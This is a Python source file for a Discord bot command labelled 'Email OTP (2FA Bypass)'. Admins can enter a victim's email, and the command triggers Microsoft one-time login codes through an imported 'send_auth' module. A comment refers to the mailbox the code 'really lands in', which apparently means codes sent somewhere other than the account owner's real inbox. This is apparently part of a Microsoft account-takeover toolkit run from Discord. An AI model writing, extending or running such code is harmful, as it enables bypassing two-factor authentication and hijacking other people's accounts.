from securing.auth.send_auth import send_auth

from discord.ext import commands
import discord
import httpx
import logging

from shared.settings import command_alias
from shared.interactions import followup

name = command_alias("request_otp")

log = logging.getLogger("bot")


class requestOTP(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @discord.slash_command(name=name, description="Email OTP (2FA Bypass)")
    async def requestotp(self, ctx: discord.ApplicationContext, email: str):

        if ctx.author.id not in self.bot.admins:
            await ctx.respond("You do not have permission to execute this command!", ephemeral=True)
            return

        await ctx.defer(ephemeral=True)

        try:
            async with httpx.AsyncClient(timeout=None) as session:
                response = await send_auth(session, email)
        except Exception:
            log.exception("request_otp failed for %s", email)
            await followup(ctx, 
                embed=discord.Embed(
                    description="GetCredentialType failed (proxy/tunnel error). Try again.",
                    color=0xFF0000,
                ),
                ephemeral=True,
            )
            return

        credentials = (response or {}).get("Credentials") if isinstance(response, dict) else None
        proofs = (credentials or {}).get("OtcLoginEligibleProofs") or []

        if not proofs:
            await followup(ctx, 
                embed=discord.Embed(
                    description="Failed to send OTP, no eligible proofs found.",
                    color=0xFF0000,
                ),
                ephemeral=True,
            )
            return

        # Microsoft reports the proof masked (jb*****@maxxspace.com); show the
        # mailbox the code really lands in, and whether MS dispatched anything at
        # all — a FlowToken comes back even when the send was refused.
        destination = (
            (response or {}).get("otc_inbox")
            or (response or {}).get("otc_destination")
            or proofs[0].get("display")
            or "?"
        )
        if (response or {}).get("otc_sent") is False:
            await followup(ctx, 
                embed=discord.Embed(
                    description=(
                        f"Microsoft refused to send a code to `{destination}` "
                        f"(State={(response or {}).get('otc_state')}). "
                        "The account may be throttled — try again shortly."
                    ),
                    color=0xFF0000,
                ),
                ephemeral=True,
            )
            return

        await followup(ctx, 
            embed=discord.Embed(
                description=f"Successfully sent OTP to `{destination}`",
                color=0x3B89FF,
            ),
            ephemeral=True,
        )


def setup(bot: commands.Bot) -> None:
    bot.add_cog(requestOTP(bot))
